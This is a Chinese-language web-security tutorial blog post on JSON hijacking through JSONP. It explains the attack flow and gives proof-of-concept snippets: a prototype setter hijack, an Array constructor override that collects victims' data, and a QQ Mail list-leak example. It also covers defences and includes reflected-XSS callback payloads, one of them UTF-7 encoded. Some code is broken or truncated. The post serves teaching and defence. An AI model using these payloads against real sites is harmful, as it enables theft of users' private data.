---
title: ​【WEB安全】WEB安全基础知识系列- JSON Hijacking
id: 1063
categories:
  - WEB安全
date: 2016-06-11 00:01:36
tags:
---

## <span style="font-family: 仿宋; font-size: 14pt;">JavaScript Hijacking和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。
</span>

## 1.攻击原理:

## <span style="font-family: 仿宋; font-size: 14pt;">Json Hijacking攻击的思想见下图：
</span>

![](https://rjgeek.github.io/images//2016/06/061016_1601_WEBWEB15.jpg)

## <span style="font-family: 仿宋; font-size: 14pt;"><!--more-->
</span>

## <span style="font-family: 仿宋; font-size: 14pt;">（1）.你正常访问信任站点（[http://www.Bank.com](http://www.bank.com/)），然后登陆信任站点。
</span>

## <span style="font-family: 仿宋; font-size: 14pt;">（2）.信任站点通过你的验证，并返回Cookie。
</span>

## <span style="font-family: 仿宋; font-size: 14pt;">（3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（[www.BadGuy.com](http://www.badguy.com/)）。
</span>

## <span style="font-family: 仿宋; font-size: 14pt;">（4）.恶意站点向请求用户访问[http://www.Bank.com](http://www.bank.com/)的一个资源。
</span>

## <span style="font-family: 仿宋; font-size: 14pt;">（5）.浏览器带着之前的Cookie信息，向信任站点发送一个AJAX的GET请求或者JSONP跨域请求
</span>

## <span style="font-family: 仿宋; font-size: 14pt;">（6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组或者回调数据如mycallback({'id':'123'})。
</span>

## <span style="font-family: 仿宋; font-size: 14pt;">（7）.你的浏览器收到来自[http://www.Bank.com](http://www.bank.com/)的响应后，转发响应中的JSON信息给恶意站点。至此，恶意站点拿到你关于[http://www.Bank.com](http://www.bank.com/)的信息。
</span>

## 2.JSONP的介绍:

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">为了更好的引述下面的话题，下面我借用stackoverflow上的话题来介绍一下JSONP
</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">JSONP is really a simple trick to overcome the XMLHttpRequest same domain policy. (As you know one cannot send AJAX (XMLHttpRequest) request to a different domain.)，So - instead of using XMLHttpRequest we have to use script HTML tags, the ones you usually use to load js files, in order for js to get data from another domain. Sounds weird?，Thing is - turns out script tags can be used in a fashion similar to XMLHttpRequest! Check this out:
</span>
``` 
script = document.createElement('script');

script.type = 'text/javascript';

script.src = 'http://www.someWebApiServer.com/some-data';</td>
``` 

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">You will end up with a script segment that looks like this after it loads the data:
</span>

``` 
{['some string 1', 'some data', 'whatever data']}
``` 

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">However this is a bit inconvenient, because we have to fetch this array from script tag. So JSONPcreators decided that this will work better(and it is):
</span>

```
script = document.createElement('script');

script.type = 'text/javascript';

script.src = 'http://www.someWebApiServer.com/some-data?callback=my_callback';</td>
``` 

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">Notice the my_callback function over there? So - when JSONP server receives your request and finds callback parameter - instead of returning plain js array it'll return this:
</span>

``` 
my_callback({['some string 1', 'some data', 'whatever data']});</td>
``` 

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">See where the profit is: now we get automatic callback (my_callback) that'll be triggered once we get the data.That's all there is to know about JSONP: it's a callback and script tags.，NOTE: these are simple examples of JSONP usage, these are not production ready scripts.
</span>

``` 
**Basic JavaScript example (simple Twitter feed using JSONP)
**
<html>
<head>
</head>;
<body>;
<div id = 'twitterFeed'></div>;

<script>

function myCallback(dataWeGotViaJsonp){

var text = '';

var len = dataWeGotViaJsonp.length;

for(var i=0;i<len;i++){

twitterEntry = dataWeGotViaJsonp[i];

text += '<p><img src = "' + twitterEntry.user.profile_image_url_https +'"/>' + twitterEntry['text'] + '</p>'

}

document.getElementById('twitterFeed').innerHTML = text;

}

</script>

<script type="text/javascript" src="http://twitter.com/status/user_timeline/padraicb.json?count=10&amp;callback=myCallback"></script>

</body>

</html>

**Basic jQuery example (simple Twitter feed using JSONP)
**

<html>

<head>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>

<script>

$(document).ready(function(){

$.ajax({

url: 'http://twitter.com/status/user_timeline/padraicb.json?count=10',

dataType: 'jsonp',

success: function(dataWeGotViaJsonp){

var text = '';

var len = dataWeGotViaJsonp.length;

for(var i=0;i<len;i++){

twitterEntry = dataWeGotViaJsonp[i];

text += '<p><img src = "' + twitterEntry.user.profile_image_url_https +'"/>' + twitterEntry['text'] + '</p>'

}

$('#twitterFeed').html(text);

}

});

})

</script>

</head>

<body>

<div id = 'twitterFeed'></div>

</body>

</html></td>
``` 

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">JSONP stands for JSON with Padding. (very poorly named technique as it really has nothing to do with what most people would think of as "padding".)
</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">总结：AJAX的底层原理是XMLHttpRequest，但是由于浏览器的同源策略，无论是get还是post请求，均不允许进行跨域操作，但是html对js和css则没有限制，这要是网站优化动静态元素分离的一个基础，JSONP就是基于此事实，去后台请求时返回可以执行的JS,例如<script type="text/javascript" src="https://ajax.min.js"></script> 返回mycallback({'id':'123'}，如果此刻在页面中有函数，Function mycallback(obj){alert(obj.id)} 则能正常的返回
</span>

## 2.攻击举例

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">实际应用中返回的数据格式有两种，一种是数据，一种是对象
</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**对象的攻击方式
**</span>
``` 
<html>

...

<body>

<script type="text/javascript">

Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});

</script>

<script src="http://example.com/Home/AdminBalances"></script>

</body>

</html>
``` 
<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中用到了Javascript的原型，如果对Javascript的原型不够熟悉，可以参考之前的文章[《【编程语言】深刻理解javascript原型（_proto_）》](http://helloword.1kapp.com/archives/1056)
</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**数组的攻击方式
**</span>
``` 


var secrets;

Array = function() {

secrets = this;

};


var yourData = '';

var i = -1;

while(secrets[++i]) {

yourData += secrets[i] + ' ';

}

alert('I stole your data: ' + yourData);

``` 

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">下面举一个实际的例子，通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用script的方式来获取该邮件列表。[WooYun: QQMail邮件泄露漏洞](http://www.wooyun.org/bugs/wooyun-2010-046) 详见地址http://www.wooyun.org/bugs/wooyun-2010-046
</span>
``` 

var Qmail={};

fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"></script>

alert(Qmail.newMailsList.nextUrl);

alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);

alert(Qmail.newMailsList.summary);


``` 

## 4.漏洞防御:

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">因为此类漏洞为CSRF的变种，因此CSRF的防御均可以使用，详见[《【WEB安全】WEB安全基础知识系列-跨站请求伪造(CSRF)》](http://helloword.1kapp.com/archives/992)，其中重点介绍JSONP中的callback防御，在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞， 举例：[http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script](http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script)>，对于 Content-Type 来说早期还有一部分人比较喜欢使用 application / javascript而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：
</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**a、严格定义 Content-Type: application / json
**</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ http://127.0.0.1/getUsers.php/x.html?callback=<script>alert(/xss/)</script>  ） 具体参考：http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646
</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**b、过滤 callback 以及 JSON 数据输出
**</span>

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。又是一个看上去很完美的解决方案，但是往往都是"事与愿违"。当年( 2011 年)一个 utf7-BOM 就复活了 n 个 XSS 漏洞。这种攻击方式主要还是存在与 IE 里(注在 IE 较新版本里已经"修复") 也就是当我们在 callback 点输出 +/v8 这样的 utf7-BOM 的时候， IE 浏览器会把当前执行的编码认为是 utf7 ,所以我们通过 utf7 提交的 XSS 代码会被自动解码并执行。如：
</span>

``` 
 http://127.0.0.1/getUsers.php?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20其中：      %2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20URLdecode 为：+/v8+ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-
``` 

<span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中 +/v8  为 utf7-BOM ，后面的为我们注入的 utf-7 编码后的 XSS 代码的：
``` 

alert(1);

``` 

## 4.总结与思考:<span style="font-family: 宋体;">
</span>

*   <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">Json Hijacking 主要是利用了服务器对请求的信任和JS的强大的灵活性，
</span>
*   <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">在使用JSONP时注意返回格式的严格定义，减少攻击的切入面
</span>

## 5.引用:

*   <span style="color: black;"><span style="font-family: 仿宋; font-size: 12pt;">http://haacked.com/archive/2009/06/25/json-hijacking.aspx/ </span><span style="font-family: 微软雅黑; font-size: 13pt;">
</span></span>
*   <span style="color: black;"><span style="font-family: 仿宋; font-size: 12pt;">http://haacked.com/archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx/</span><span style="font-family: 微软雅黑; font-size: 10pt;">
</span></span>
*   <span style="color: black; font-family: 仿宋; font-size: 12pt;">http://stackoverflow.com/questions/2067472/what-is-jsonp-all-about
</span>
*   <span style="color: black; font-family: 仿宋; font-size: 12pt;">http://www.wooyun.org/bugs/wooyun-2010-046
</span>
*   <span style="color: black; font-family: 仿宋; font-size: 12pt;">http://www.csdn.net/article/2015-07-14/2825207
</span>